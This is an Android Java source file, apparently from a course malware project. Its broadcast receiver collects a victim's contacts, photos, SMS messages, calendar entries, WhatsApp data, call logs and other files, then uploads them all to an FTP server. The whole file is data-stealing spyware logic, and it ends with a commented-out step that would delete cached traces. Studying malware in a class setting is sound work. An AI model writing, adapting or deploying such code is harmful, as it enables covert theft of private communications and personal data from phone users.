package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import java.io.File;
import java.util.HashMap;

public class LeakEverything  extends BroadcastReceiver{
    @Override
    public void onReceive(Context context, Intent intent) {

        HashMap<String, File[]> files = new HashMap<>();

        // contacts
        File[] contacts = new ContactsLeakage().leak(context);
        if (contacts!=null) files.put("contacts", contacts);

        // DCIM
        File[] dcim = new DCIMLeakage().leak(context);
        if (dcim!=null) files.put("DCIM", dcim);

        // SMS
        File[] sms = new SMSLeakage().leak(context);
        if (sms!=null) files.put("sms", sms);

        // calendar
        File[] calendar = new CalendarLeakage().leak(context);
        if (calendar!=null) files.put("calendar", calendar);

        // whatsapp
        File[] whatsapp = new WhatsAppLeakage().leak(context);
        if (whatsapp!=null) files.put("whatsapp", whatsapp);

        // stuffs
        File[] stuffs = new LeakOtherStuffs().leak(context);
        if (stuffs!=null) files.put("", stuffs);

        // call log
        File[] call = new CallLogLeakage().leak(context);
        if (call!=null) files.put("call", call);

        // upload
        new FTP(context).upload(files);

        /* clear cache dir
        File[] dir = context.getCacheDir().listFiles();
        if(dir !=null)
            for(File file: dir)
                file.delete();
    */
    }
}
